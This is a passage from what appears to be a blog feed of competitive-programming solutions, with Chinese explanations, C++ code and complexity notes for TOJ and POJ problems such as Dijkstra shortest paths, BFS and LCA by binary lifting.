class="params">()</span></span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">cin</span>.tie(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">cout</span>.tie(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">    &#125;</span><br><span class="line">    sort(arr,arr+n);</span><br><span class="line">    <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">0</span> || arr[i]==arr[i<span class="number">-1</span>])</span><br><span class="line">            cnt[j]++;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            cnt[++j]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,k ; i&lt;=j ; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(cnt[i]%<span class="number">2</span>) odd++;</span><br><span class="line">        ans*=p(cnt[i],cnt[i]/<span class="number">2</span>);</span><br><span class="line">        ans%=mod;</span><br><span class="line">        diff+=cnt[i]/<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=diff ; i++)&#123;</span><br><span class="line">        ans*=i;</span><br><span class="line">        ans%=mod;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(odd&gt;<span class="number">1</span>) <span class="built_in">cout</span>&lt;&lt;<span class="number">0</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>大約為 $O(不同數字數量)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 537</title>
    <url>/2021/03/23/TOJ537/</url>
    <content><![CDATA[<h1 id="TOJ-537"><a href="#TOJ-537" class="headerlink" title="TOJ 537"></a>TOJ 537</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/537/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/537/</a></p>
<p>輸入三個數字 $a, b, c$ ，判斷是否任兩個數字的和都大於第三個數字</p>
<p>跟三角形判斷是相同意思</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>先將三個數字由小到大排序，我們只需要判斷最小的兩個數字和是否大於第三個數字即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a,b,c;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b&gt;&gt;c;</span><br><span class="line">	<span class="keyword">if</span>(a&gt;b) swap(a,b);</span><br><span class="line">	<span class="keyword">if</span>(b&gt;c) swap(b,c);</span><br><span class="line">	<span class="keyword">if</span>(a&gt;b) swap(a,b);</span><br><span class="line">	<span class="keyword">if</span>(a+b&gt;c) <span class="built_in">cout</span>&lt;&lt;<span class="string">"yes\n"</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;<span class="string">"no\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(1)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 92</title>
    <url>/2021/03/23/TOJ92/</url>
    <content><![CDATA[<h1 id="TOJ-92"><a href="#TOJ-92" class="headerlink" title="TOJ 92"></a>TOJ 92</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/92/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/92/</a></p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">string</span> s1,s2,s3;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;s1&gt;&gt;s2&gt;&gt;s3;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"Hello, "</span>&lt;&lt;s1&lt;&lt;<span class="string">", "</span>&lt;&lt;s2&lt;&lt;<span class="string">", and "</span>&lt;&lt;s3&lt;&lt;<span class="string">"!\n"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(1)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 565</title>
    <url>/2020/09/18/TOJ565/</url>
    <content><![CDATA[<h1 id="TOJ-565"><a href="#TOJ-565" class="headerlink" title="TOJ 565"></a>TOJ 565</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://toj.tfcis.org/oj/pro/565/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/565/</a><br>給一張捷運的路線圖以及兩個整數 $A$ $B$ 和起點 $S$，從 $i$ 站到 $j$ 站所需要的花費為<br>$A<em>經過路線數 + B</em>經過路線權重總和$<br>求 $S$ 到各點所需的最小花費</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>Dijkstra 模板題<br>如果點 $i$ 到點 $j$ 最短路徑為 $A$<br>則點 $i$ 到 $A$ 上的任一點的路徑也必定為最短路徑 (前提是邊權都是正的)<br>所以，我們可以每次都走距離最短的路，不斷更新起點到終點的距離，最終更新完必定會是最短距離</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mp make_pair</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e5</span>+<span class="number">10</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF = <span class="number">9223372036854775807</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,a,b,s;</span><br><span class="line"><span class="built_in">vector</span>&lt;pii&gt; E[N];</span><br><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">dis</span><span class="params">(N,INF)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">()</span></span>&#123;</span><br><span class="line">	priority_queue&lt;pii&gt; pq;</span><br><span class="line">	pq.emplace(dis[s]=<span class="number">0</span>,s);</span><br><span class="line">	<span class="keyword">while</span>(pq.size())&#123;</span><br><span class="line">		<span class="keyword">int</span> d,u;</span><br><span class="line">		tie(d,u)=pq.top();</span><br><span class="line">		d*=(<span class="number">-1</span>);</span><br><span class="line">		pq.pop();</span><br><span class="line">		<span class="keyword">if</span>(d!=dis[u]) <span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> e: E[u])&#123;</span><br><span class="line">			<span class="keyword">int</span> w,v;</span><br><span class="line">			tie(w,v)=e;</span><br><span class="line">			<span class="keyword">if</span>(dis[v]&lt;=dis[u]+a+b*w) <span class="keyword">continue</span>;</span><br><span class="line">			dis[v]=dis[u]+a+b*w;</span><br><span class="line">			pq.emplace(-dis[v],v);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m&gt;&gt;a&gt;&gt;b&gt;&gt;s;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,u,v,w ; i&lt;m ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;u&gt;&gt;v&gt;&gt;w;</span><br><span class="line">		E[u].emplace_back(w,v);</span><br><span class="line">		E[v].emplace_back(w,u);</span><br><span class="line">	&#125;</span><br><span class="line">	dijkstra();</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;dis[i]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>使用 priority_queue 維護要加入的邊，複雜度為 $O(logN)$ </br><br>總共有 $N$ 個點，總複雜度為 $O(NlogN)$ </br></p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
        <tag>Shortest Path</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 94</title>
    <url>/2021/03/23/TOJ94/</url>
    <content><![CDATA[<h1 id="TOJ-94"><a href="#TOJ-94" class="headerlink" title="TOJ 94"></a>TOJ 94</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/94/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/94/</a></p>
<p>輸入月份輸出季節</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">if</span>(n&gt;=<span class="number">3</span> &amp;&amp; n&lt;=<span class="number">5</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Spring!\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(n&gt;=<span class="number">6</span> &amp;&amp; n&lt;=<span class="number">8</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Summer!\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(n&gt;=<span class="number">9</span> &amp;&amp; n&lt;=<span class="number">11</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Autumn!\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Winter!\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(1)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 9</title>
    <url>/2020/09/23/TOJ9/</url>
    <content><![CDATA[<h1 id="TOJ-9"><a href="#TOJ-9" class="headerlink" title="TOJ 9"></a>TOJ 9</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://toj.tfcis.org/oj/pro/9/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/9/</a><br>給一張圖，有兩種遍歷方式，給定起點與終點高度，求兩種遍歷方式的時間差<br>終點為該圖的最低高度點，可能有多個</p>
<ol>
<li>坐下坡車<br> 每經過一條路需花 $1$ 分鐘<br> 每次只能走向下最陡的路<br> 如果四周都比該點高，則無法通行</li>
<li>走路<br> 每經過一條路需花 $6$ 分鐘<br> 想怎麼走就怎麼走</li>
</ol>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>從起點開始做兩次 BFS</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> t,n,m,s,h[<span class="number">10010</span>],Goal=<span class="number">2147483647</span>;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; nxt[<span class="number">10010</span>];</span><br><span class="line"><span class="keyword">bool</span> inq[<span class="number">10010</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_car_time</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">queue</span>&lt;pii&gt; q;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">10010</span> ; i++) inq[i]=<span class="literal">false</span>;</span><br><span class="line">	q.emplace(s,<span class="number">0</span>);inq[s]=<span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">while</span>(!q.empty())&#123;</span><br><span class="line">		<span class="keyword">int</span> now,r;</span><br><span class="line">		tie(now,r)=q.front();q.pop();</span><br><span class="line">		<span class="keyword">if</span>(h[now] == Goal)&#123;</span><br><span class="line">			<span class="keyword">return</span> r*<span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> Max=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;nxt[now].size() ; i++)</span><br><span class="line">			Max=max(Max,h[now]-h[nxt[now][i]]);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> i : nxt[now])&#123;</span><br><span class="line">			<span class="keyword">if</span>(h[now]-h[i]==Max &amp;&amp; !inq[i])&#123;</span><br><span class="line">				q.emplace(i,r+<span class="number">1</span>);</span><br><span class="line">				inq[i]=<span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_walk_time</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">queue</span>&lt;pii&gt; q;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">10010</span> ; i++) inq[i]=<span class="literal">false</span>;</span><br><span class="line">	q.emplace(s,<span class="number">0</span>);inq[s]=<span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">while</span>(!q.empty())&#123;</span><br><span class="line">		<span class="keyword">int</span> now,r;</span><br><span class="line">		tie(now,r)=q.front();q.pop();</span><br><span class="line">		<span class="keyword">if</span>(h[now]==Goal)&#123;</span><br><span class="line">			<span class="keyword">return</span> r*<span class="number">6</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;nxt[now].size() ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(!inq[nxt[now][i]])&#123;</span><br><span class="line">				q.emplace(nxt[now][i],r+<span class="number">1</span>);</span><br><span class="line">				inq[nxt[now][i]]=<span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=t ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">10010</span> ; i++)&#123;</span><br><span class="line">			nxt[i].clear();</span><br><span class="line">		&#125;</span><br><span class="line">		Goal=<span class="number">2147483647</span>;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m&gt;&gt;s;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;h[i];</span><br><span class="line">			Goal=min(Goal,h[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,u,v ; i&lt;m ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;u&gt;&gt;v;</span><br><span class="line">			nxt[u].emplace_back(v);</span><br><span class="line">			nxt[v].emplace_back(u);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> car=get_car_time();</span><br><span class="line">		<span class="keyword">int</span> walk=get_walk_time();</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"Case #"</span>&lt;&lt;i&lt;&lt;<span class="string">": "</span>;</span><br><span class="line">		<span class="keyword">if</span>(car==<span class="number">-1</span> &amp;&amp; walk==<span class="number">-1</span>)</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"Call 119!\n"</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(car==<span class="number">-1</span>)</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;walk&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="built_in">abs</span>(car-walk)&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>最糟的情況是將整張圖都走過一次<br>複雜度 $O(TN)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>TOJ</tag>
        <tag>BFS</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 99</title>
    <url>/2021/03/23/TOJ99/</url>
    <content><![CDATA[<h1 id="TOJ-99"><a href="#TOJ-99" class="headerlink" title="TOJ 99"></a>TOJ 99</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/99/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/99/</a></p>
<p>給一個二階矩陣 \begin{vmatrix} a&amp;b\c&amp;d \end{vmatrix}</p>
<p>求 $\left| a<em>d - b</em>c \right|$ 是否非零，誤差值在小數點後 7 位</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>這題是要測試是否知道使用 eps</p>
<p>在 C/C++ 當中，小數點只能是”大致上”準確的，所以像是小數再判斷是否為零不能直接判斷</p>
<p>我們通常會設定一個誤差值，像是本題就是 $10^{-7}$ ，當我們的值小於該誤差值就會被判定為 0</p>
<p>所以我們只需要改用 eps 來判斷就可以囉</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">double</span> eps=<span class="number">1e-7</span>;</span><br><span class="line"><span class="keyword">double</span> a,b,c,d;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b&gt;&gt;c&gt;&gt;d;</span><br><span class="line">	<span class="keyword">double</span> result = a*d-b*c;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">fabs</span>(result)&gt;=eps)&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"1\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"0\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>計算以及判斷都只有一次，時間複雜度為 $O(1)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>POJ 1330</title>
    <url>/2020/09/25/POJ1330/</url>
    <content><![CDATA[<h1 id="POJ-1330"><a href="#POJ-1330" class="headerlink" title="POJ 1330"></a>POJ 1330</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://vjudge.net/problem/POJ-1330" target="_blank" rel="noopener">https://vjudge.net/problem/POJ-1330</a><br>LCA 模板題<br>給一棵樹，有 $T$ 筆詢問，求點 $u$ 與 $v$ 的最低共同祖先</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>使用倍增法爬行<br>先將兩點維持到相同的深度<br>如果兩點相同，則這個點就是答案<br>否則爬行直到兩者的祖先是相同的</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> t,n,l,r,root,lgN;</span><br><span class="line"><span class="keyword">int</span> P[<span class="number">10010</span>][<span class="number">100</span>],D[<span class="number">10010</span>],from[<span class="number">10010</span>];</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; nxt[<span class="number">10010</span>];</span><br><span class="line"><span class="comment">//Parents</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">computeP</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;lgN ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span> ; j&lt;=n ; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(P[j][i] == <span class="number">-1</span>) P[j][i+<span class="number">1</span>] = <span class="number">-1</span>;</span><br><span class="line">			<span class="keyword">else</span> P[j][i+<span class="number">1</span>] = P[P[j][i]][i];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> vis[<span class="number">10010</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">computeD</span><span class="params">(<span class="keyword">int</span> px,<span class="keyword">int</span> h)</span></span>&#123;</span><br><span class="line">	D[px]=h;</span><br><span class="line">	vis[px]=<span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;nxt[px].size() ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(!vis[nxt[px][i]])</span><br><span class="line">			computeD(nxt[px][i],h+<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Distance</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LCA</span><span class="params">(<span class="keyword">int</span> u,<span class="keyword">int</span> v)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(D[u]&gt;D[v])</span><br><span class="line">		swap(u,v);</span><br><span class="line">	<span class="keyword">int</span> dis=D[v]-D[u];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=lgN ; i&gt;=<span class="number">0</span> ; i--)&#123;</span><br><span class="line">		<span class="keyword">if</span>(dis&amp;(<span class="number">1</span>&lt;&lt;i)) v=P[v][i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(u==v) <span class="keyword">return</span> v;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=lgN ; i&gt;=<span class="number">0</span> ; i--)&#123;</span><br><span class="line">		<span class="keyword">if</span>(P[u][i] != P[v][i])&#123;</span><br><span class="line">			u=P[u][i];</span><br><span class="line">			v=P[v][i];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> P[v][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logbase</span><span class="params">(<span class="keyword">double</span> a, <span class="keyword">double</span> base)</span></span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">log</span>(a) / <span class="built_in">log</span>(base);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">	lgN=logbase(n,<span class="number">2</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>  ; i&lt;<span class="number">10010</span> ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;lgN ;  j++)&#123;</span><br><span class="line">			P[i][j]=<span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		D[i]=<span 